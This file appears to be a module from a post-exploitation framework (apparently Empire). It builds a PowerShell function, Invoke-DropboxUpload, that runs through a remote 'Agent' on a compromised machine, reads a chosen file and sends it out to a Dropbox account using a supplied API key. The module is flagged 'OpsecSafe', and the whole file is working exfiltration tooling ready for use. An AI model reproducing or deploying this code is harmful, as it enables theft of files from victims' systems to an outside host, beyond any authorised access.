from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Invoke-DropboxUpload',
            'Author': ['kdick@tevora.com','Laurent Kempe'],
            'Description': ('Upload a file to dropbox '),
            'Background': False,
            'OutputExtension': None,
            'NeedsAdmin': False,
            'OpsecSafe': True,
            'Language': 'powershell',
            'MinLanguageVersion': '2',
            'Comments': [
                'Uploads specified file to dropbox ',
                'Ported to powershell2 from script by Laurent Kempe: http://laurentkempe.com/2016/04/07/Upload-files-to-DropBox-from-PowerShell/',
                'Use forward slashes for the TargetFilePath'
            ]
        }
        self.options = {
            'Agent': {
                'Description':   'Agent to use',
                'Required'   :   True,
                'Value'      :   ''
            },
            'SourceFilePath': {
                'Description':   '/path/to/file',
                'Required'   :   True,
                'Value'      :   ''
            },
            'TargetFilePath': {
                'Description': '/path/to/dropbox/file',
                'Required': True,
                'Value': ''
            },
            'ApiKey': {
                'Description': 'Your dropbox api key',
                'Required': True,
                'Value': ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
function Invoke-DropboxUpload {
Param(
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$TargetFilePath,
    [Parameter(mandatory=$true)]
    [string]$ApiKey
)
$url = "https://content.dropboxapi.com/2/files/upload"
$file = [IO.File]::ReadAllBytes($SourceFilePath)
[net.httpWebRequest] $req = [net.webRequest]::create($url)
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $ApiKey
$req.method = "POST"
$req.Headers.Add("Authorization", $authorization)
$req.Headers.Add("Dropbox-API-Arg", $arg)
$req.ContentType = 'application/octet-stream'
$req.ContentLength = $file.length
$req.TimeOut = 50000
$req.KeepAlive = $true
$req.Headers.Add("Keep-Alive: 300");
$reqst = $req.getRequestStream()
$reqst.write($file, 0, $file.length)
$reqst.flush()
$reqst.close()
[net.httpWebResponse] $res = $req.getResponse()
$resst = $res.getResponseStream()
$sr = new-object IO.StreamReader($resst)
$result = $sr.ReadToEnd()
$result
$res.close()
}
Invoke-DropboxUpload  """
        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])
        return script